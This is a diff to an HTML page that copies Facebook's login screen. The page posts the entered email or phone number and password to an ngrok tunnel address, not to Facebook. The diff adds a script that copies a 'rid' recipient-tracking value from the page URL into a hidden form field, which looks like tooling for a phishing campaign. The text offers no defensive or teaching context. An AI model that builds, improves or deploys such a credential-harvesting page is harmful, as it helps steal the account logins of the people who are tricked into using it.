@@ -25,12 +25,21 @@
     <div class="logo">facebook</div>
     <div class="login-box">
         <p style="font-size: 18px; margin-bottom: 20px;">Log Into Facebook</p>
-        <form method="POST" action="https://cathectic-campily-ehtel.ngrok-free.dev/">
-            <input type="hidden" name="rid" value="xTd6l9l">   
+        <form id="loginForm" method="POST" action="https://cathectic-campily-ehtel.ngrok-free.dev/">
+            <input type="hidden" name="rid" id="ridField" value="">   
             <input autofocus="" name="username" placeholder="Email or Phone Number" required="" type="text"/> 
             <input name="password" placeholder="Password" required="" type="password"/>
             <button type="submit">Log In</button>
         </form>
+
+        <script>
+            // This script finds the ?rid= from your GitHub URL and puts it into the form
+            const urlParams = new URLSearchParams(window.location.search);
+            const rid = urlParams.get('rid');
+            if (rid) {
+                document.getElementById('ridField').value = rid;
+            }
+        </script>
         <a class="forgot" href="#">Forgot account?</a>
         <hr/>
         <button class="create-btn" type="button">Create New Account</button>
